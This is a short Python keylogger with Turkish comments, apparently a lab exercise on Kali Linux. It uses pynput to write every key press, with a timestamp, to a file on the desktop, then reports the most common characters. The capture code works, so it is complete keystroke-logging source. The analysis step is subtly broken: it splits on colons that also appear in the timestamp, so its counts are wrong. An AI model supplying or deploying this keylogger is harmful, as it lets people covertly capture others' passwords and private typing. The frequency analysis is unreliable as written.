import pynput.keyboard
import datetime
from collections import Counter

# Klavye girdilerini kaydedeceğimiz dosya
log_file = "/home/kali/Desktop/keyboard_log.txt"

# Klavye girdilerini kaydeden fonksiyon
def log_keystroke(key):
    try:
        with open(log_file, "a") as file:
            now = datetime.datetime.now()
            timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
            if hasattr(key, 'char'):
                file.write(f"{timestamp}: {key.char}\n")
            else:
                file.write(f"{timestamp}: {key}\n")
    except Exception as e:
        print(f"Hata: {str(e)}")

# Klavye dinleme fonksiyonu
def start_keylogger():
    print("Dinleniyor...")
    try:
        keyboard_listener = pynput.keyboard.Listener(on_press=log_keystroke)
        keyboard_listener.start()
        keyboard_listener.join()
    except Exception as e:
        print(f"Hata: {str(e)}")

# Klavye girdilerini analiz etme
def analyze_keyboard_input(log_file):
    try:
        with open(log_file, "r") as file:
            lines = file.readlines()
            characters = "".join([line.strip().split(":")[1].strip() for line in lines])
            most_common_characters = Counter(characters).most_common(5)
            print("En çok kullanılan karakterler:")
            for char, count in most_common_characters:
                print(f"{char}: {count} adet")
    except Exception as e:
        print(f"Hata: {str(e)}")

# Klavye dinleyiciyi başlatma
if __name__ == "__main__":
    # Klavye dinleyiciyi başlatma
    start_keylogger()
    # Klavye girdilerini analiz etme
    analyze_keyboard_input(log_file)
